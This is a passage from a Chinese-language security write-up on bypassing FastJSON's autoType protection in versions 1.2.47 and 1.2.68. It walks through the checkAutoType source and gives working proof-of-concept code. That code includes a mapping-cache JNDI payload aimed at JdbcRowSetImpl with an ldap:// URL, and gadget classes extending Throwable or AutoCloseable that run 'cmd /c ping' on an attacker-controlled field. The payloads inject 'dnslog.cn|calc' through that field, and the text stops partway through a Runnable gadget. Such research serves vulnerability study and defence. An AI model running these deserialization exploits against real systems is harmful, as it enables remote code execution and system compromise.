                    is = defaultClassLoader.getResourceAsStream(resource);
                } else {
                    is = ParserConfig.class.getClassLoader().getResourceAsStream(resource);
                }
                if (is != null) {
                    ClassReader classReader = new ClassReader(is, true);
                    TypeCollector visitor = new TypeCollector("", new Class[0]);
                    classReader.accept(visitor);
                    jsonType = visitor.hasJsonType();
                }
            } catch (Exception e) {
                // skip
            } finally {
                IOUtils.close(is);
            }
之后检查是否开启AutoType或者有注解或者是期望类，则直接加载类，如果条件不满足或成功加载类后clazz不为NULL，则进一步判断是否有注解，如果有则加入mapping并直接返回实例类，如果没有注解则判断clazz是否继承或实现ClassLoader、javax.sql.DataSource、javax.sql.RowSet类，如果满足以上条件则直接抛出异常，这里这样做的目的主要是规避大多数的JNDI注入(JNDI注入大多数与DataSource类、RowSet类相关)，之后如果expectClass不为NULL，则检查clazz是否是expectClass的实现或继承，如果类指定了JSONCreator注解，并且开启了SupportAutoType则抛出异常：
    final int mask = Feature.SupportAutoType.mask;
            boolean autoTypeSupport = this.autoTypeSupport
                    || (features & mask) != 0
                    || (JSON.DEFAULT_PARSER_FEATURE & mask) != 0;
            if (autoTypeSupport || jsonType || expectClassFlag) {
                boolean cacheClass = autoTypeSupport || jsonType;
                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, cacheClass);
            }
            if (clazz != null) {
                if (jsonType) {
                    TypeUtils.addMapping(typeName, clazz);
                    return clazz;
                }
                if (ClassLoader.class.isAssignableFrom(clazz) // classloader is danger
                        || javax.sql.DataSource.class.isAssignableFrom(clazz) // dataSource can load jdbc driver
                        || javax.sql.RowSet.class.isAssignableFrom(clazz) //
                        ) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
                if (expectClass != null) {
                    if (expectClass.isAssignableFrom(clazz)) {
                        TypeUtils.addMapping(typeName, clazz);
                        return clazz;
                    } else {
                        throw new JSONException("type not match. " + typeName + " -> " + expectClass.getName());
                    }
                }
                JavaBeanInfo beanInfo = JavaBeanInfo.build(clazz, clazz, propertyNamingStrategy);
                if (beanInfo.creatorConstructor != null && autoTypeSupport) {
                    throw new JSONException("autoType is not support. " + typeName);
                }
            }
最后判断是否开启autoTypeSupport，如果未开启则直接抛出异常，否则检查clazz是否为NULL，如果不为NULL则加入mapping，最后返回示例类：
    if (!autoTypeSupport) {
                throw new JSONException("autoType is not support. " + typeName);
            }
            if (clazz != null) {
                TypeUtils.addMapping(typeName, clazz);
            }
            return clazz;
        }
通过上面的分析，我们可以了解到这里的checkAutoType其实就是一个校验和加载类的过程，而且SupportAutoType的校验是最后进行的，这样做的目的之一正是为了实现基础类的任意反序列化的feature(特性)，这也就意味着需要通过逻辑来保证在这之前返回的类都是安全的，但也正是这个原因导致了AutoType的Bypass，同时我们可以看到当出现以下情况是会直接返回示例类：
  * 白名单里的类(acceptHashCodes+INTERNAL_WHITELIST_HASHCODES(内部白名单))
  * 开启了AutoType
  * 使用了JSONType注解
  * 指定了期望类(expectClass)
  * 缓存mapping中的类  
## 绕过实践  
### Mapping绕过  
首先，我们来回顾以下FastJSON
1.2.47的绕过——缓存mapping中的类，根据上面的校验原理部分我们可以了解到当mappings缓存中存在指定的类时，可以直接返回并且不受SupportAutoType限制，在TypeUtils.loadClass方法中，如果参数中cache值为true时，则会在加载到类之后，将类加入mappings缓存：  
完整的代码如下：
        public static Class loadClass(String className, ClassLoader classLoader, boolean cache) {
          if(className == null || className.length() == 0 || className.length() > 128){
              return null;
          }
          Class clazz = mappings.get(className);
          if(clazz != null){
              return clazz;
          }
          if(className.charAt(0) == '['){
              Class componentType = loadClass(className.substring(1), classLoader);
              return Array.newInstance(componentType, 0).getClass();
          }
          if(className.startsWith("L") && className.endsWith(";")){
              String newClassName = className.substring(1, className.length() - 1);
              return loadClass(newClassName, classLoader);
          }
          try{
              if(classLoader != null){
                  clazz = classLoader.loadClass(className);
                  if (cache) {
                      mappings.put(className, clazz);
                  }
                  return clazz;
              }
          } catch(Throwable e){
              e.printStackTrace();
              // skip
          }
          try{
              ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();
              if(contextClassLoader != null && contextClassLoader != classLoader){
                  clazz = contextClassLoader.loadClass(className);
                  if (cache) {
                      mappings.put(className, clazz);
                  }
                  return clazz;
              }
          } catch(Throwable e){
              // skip
          }
          try{
              clazz = Class.forName(className);
              if (cache) {
                  mappings.put(className, clazz);
              }
              return clazz;
          } catch(Throwable e){
              // skip
          }
          return clazz;
      }
之后全局查找所有调用了该函数位置，并且cache设置为true的函数，发现只有它的重载函数：  
        public static Class loadClass(String className, ClassLoader classLoader) {
          return loadClass(className, classLoader, true);
      }
之后继续寻找调用了该重载的地方，发现在MiscCode处有调用：  
        if (clazz == Class.class) {
              return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());
          }
上面的逻辑是当class是一个java.lang.Class类时，会去加载指定类(从而也就无意之间加入了mappings缓存)，而java.lang.Class同时也是个默认特殊类——deserializers.findClass指定类，可以直接反序列化，所以可以首先通过反序列化java.lang.Class指定恶意类，然后恶意类被加入mappings缓存后，第二次就可以直接从缓存中获取到恶意类，并进行反序列化：  
1.2.47的有效载荷如下：  
```java  
package com.FastJson1242;
import com.alibaba.fastjson.JSONObject;
public class Poc {  
public static void main(String[] argv){  
String payload ="{\n" +  
" \"a\": {\n" +  
" \"@type\": \"java.lang.Class\", \n" +  
" \"val\": \"com.sun.rowset.JdbcRowSetImpl\"\n" +  
" }, \n" +  
" \"b\": {\n" +  
" \"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \n" +  
" \"dataSourceName\": \"ldap://localhost:1099/Exploit\", \n" +  
" \"autoCommit\": true\n" +  
" }\n" +  
"}";  
JSONObject.parseObject(payload);  
}  
}
    执行结果如下：
    ### exceptClass期望类
    #### ThrowableDeserializer
    期望类的功能主要是实现/继承了期望类的class能被反序列化出来且不受autotype影响，默认情况下exceptClass这个参数是空的，也就不存在期望类的特性，之后全局搜索checkAutoType的调用，且条件是exceptClass不为空：
    从上面的搜索结果中可以看到在JavaBeanDeserializer、ThrowableDeserializer中调用了checkAutoType并且exceptClass不为空，我们这里先来看一下ThrowableDeserializer，该类主要是对Throwable异常类进行反序列化，我们可以在ParserConfig.getDeserializer中找到对应的反序列化示例类型：
    com\alibaba\fastjson\1.2.68\fastjson-1.2.68-sources.jar!\com\alibaba\fastjson\parser\ParserConfig.java 826
    可以从上面看到ThrowableDeserializer是Throwable用来反序列化异常类的，我们先来看一下ThrowableDeserializer，可以看到在ThrowableDeserializer中可以根据第二个@type的值来获取具体类，并且根据传入的指定期望类进行加载：
    因此可以反序列化继承自Throwable的异常类，在这里我们可以借助setter、getter等方法的自动调用，来挖掘gadget，下面是浅蓝师提供的一个Gadget：
    ```java
    package org.heptagram.fastjson;
    import java.io.IOException;
    public class ViaThrowable extends Exception {
        private String domain;
        public ViaThrowable() {
            super();
        }
        public String getDomain() {
            return domain;
        }
        public void setDomain(String domain) {
            this.domain = domain;
        }
        @Override
        public String getMessage() {
            try {
                Runtime.getRuntime().exec("cmd /c ping "+domain);
            } catch (IOException e) {
                return e.getMessage();
            }
            return super.getMessage();
        }
    }
测试载荷：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSONObject;
    public class ThrowableMain {
        public static void main(String[] args) {
            String payload ="{\n" +
                    "  \"@type\":\"java.lang.Exception\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.ViaThrowable\",\n" +
                    "  \"domain\": \"qbknro.dnslog.cn|calc\"\n" +
                    "}";
            JSONObject.parseObject(payload);
        }
    }
在上面的载荷中我们一共传入了两个@type，其中第一个是期望类(expectClass)，第二个是需要反序列化的类，经过这样构造后在检查AutoTypeSupport之前就已经返回了clazz，之后接着为期望类选择反序列化的解析器，从而匹配到了Throwable.class，之后当扫描到第二个@type指定的类名后将其作为exClassName传入checkAutoType，此时checkAutotype传入的第二个参数为Throable.class也为Exception.class的接口，此时如果exClassName是实现或继承自Throwable就能过checkAutotype，下面是执行的结果：  
#### JavaBeanDeserializer
在fastjson中对大部分类都指定了特定的deserializer，如果未指定则会通过createJavaBeanDeserializer()来指定deserializer，通常情况下都是一些第三方类才会调用到这里：  
/com/alibaba/fastjson/1.2.68/fastjson-1.2.68-sources.jar!/com/alibaba/fastjson/parser/ParserConfig.java
832  
在FastJSON中com.alibaba.fastjson.util.TypeUtils#addBaseClassMappings用于添加一些基本的类并将其当做缓存使用，但是在查看时可以发现这里的额外加载了一个java.lang.AUtoCloseable类，同时并未为其指定deserializer，因此会走到最后的else条件中去，之后对应的JavaBeanDeserializer，而且java.lang.AUtoCloseable类位于mapping缓存中，所以可以无条件反序列化：  
和之前一样，我们可以通过继承或者实现AutoCloseable类来绕过autotype反序列化检测，测试代码如下：
    package org.heptagram.fastjson;
    import java.io.IOException;
    import java.io.Closeable;
    public class ViaAutoCloseable  implements Closeable {
        private String domain;
        public ViaAutoCloseable() {
        }
        public ViaAutoCloseable(String domain) {
            this.domain = domain;
        }
        public String getDomain() {
            try {
                Runtime.getRuntime().exec(new String[]{"cmd", "/c", "ping " + domain});
            } catch (IOException e) {
                e.printStackTrace();
            }
            return domain;
        }
        public void setDomain(String domain) {
            this.domain = domain;
        }
        @Override
        public void close() throws IOException {
        }
    }
载荷构造：
    package org.heptagram.fastjson;
    import com.alibaba.fastjson.JSONObject;
    public class AutoCloseableMain {
        public static void main(String[] args) {
            String payload ="{\n" +
                    "  \"@type\":\"java.lang.AutoCloseable\",\n" +
                    "  \"@type\": \"org.heptagram.fastjson.ViaAutoCloseable\",\n" +
                    "  \"domain\": \" wme8bg.dnslog.cn| calc\"\n" +
                    "}";
            JSONObject.parseObject(payload);
        }
    }
执行结果如下：  
在这里我们查看以下AutoCloseable类的继承关系，可以看到通过AutoCloseable来Bypass
AutoType我们找寻Gadget的范围则变得更加宽广，常用的流操作、文件操作、socket等等都继承自AutoCloseable：  
在查阅相关资料的时候看到Y4er师傅在其文章中描述到FastJson在黑名单中新增的java.lang.Runnable、java.lang.Readable类也可以用于Bypass
AutoType，下面是Y4er师傅提供的载荷：  
A、Runnable：
    package org.heptagram.fastjson;
    import java.io.IOException;
    public class ExecRunnable implements AutoCloseable {
        private EvalRunnable eval;
        public EvalRunnable getEval() {
            return eval;
        }
        public void setEval(EvalRunnable eval) {